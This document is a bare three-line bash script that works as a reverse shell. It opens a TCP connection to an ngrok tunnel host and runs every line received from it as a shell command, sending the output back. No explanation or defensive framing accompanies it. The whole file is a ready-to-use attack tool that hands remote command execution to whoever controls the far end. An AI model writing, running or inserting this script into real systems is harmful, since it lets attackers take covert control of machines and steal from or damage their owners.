#!/bin/bash
exec 5<> /dev/tcp/0.tcp.jp.ngrok.io/10478
cat <&5 | while read line; do $line 2>&5 >&5; done
